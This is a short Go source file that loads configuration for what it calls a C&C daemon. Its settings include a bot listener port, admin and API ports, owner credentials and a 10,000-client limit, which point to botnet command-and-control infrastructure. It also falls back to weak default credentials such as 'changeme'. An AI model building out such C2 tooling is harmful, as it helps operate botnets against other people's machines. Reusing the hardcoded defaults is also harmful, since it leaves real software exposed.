// language: go
// file: cnc/config.go
// runtime: go 1.20+
// target: Configuration loader and structure for the C&C daemon

package main

import (
	"errors"
	"os"
	"strings"
	"time"
)

type Config struct {
	BotAddr       string   `json:"bot_addr"`
	AdminAddr     string   `json:"admin_addr"`
	APIAddr       string   `json:"api_addr"`
	GeoIPPath     string   `json:"geoip_path"`
	OwnerUser     string   `json:"owner_user"`
	OwnerPass     string   `json:"owner_pass"`
	APIKeys       []string `json:"api_keys"`
	MaxClients    int      `json:"max_clients"`
	AdminPassword string   `json:"admin_password"`
}

func loadConfig() (*Config, error) {
	cfg := &Config{
		BotAddr:       envOr("BH_BOT_ADDR", ":1212"),
		AdminAddr:     envOr("BH_ADMIN_ADDR", ":9111"),
		APIAddr:       envOr("BH_API_ADDR", ":3434"),
		GeoIPPath:     os.Getenv("BH_GEOIP"),
		OwnerUser:     envOr("BH_OWNER_USER", "root"),
		OwnerPass:     envOr("BH_OWNER_PASS", ""),
		MaxClients:    10000,
		AdminPassword: envOr("BH_ADMIN_PASS", "changeme"),
	}

	if cfg.OwnerPass == "" {
		return nil, errors.New("BH_OWNER_PASS is required")
	}

	raw := os.Getenv("BH_API_KEYS")
	if raw == "" {
		cfg.APIKeys = []string{"default-api-key-change-me:default"}
	} else {
		for _, k := range strings.Split(raw, ",") {
			k = strings.TrimSpace(k)
			if k != "" {
				cfg.APIKeys = append(cfg.APIKeys, k)
			}
		}
	}

	return cfg, nil
}

func envOr(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}

var timeNowFn = func() int64 {
	return time.Now().UnixNano()
}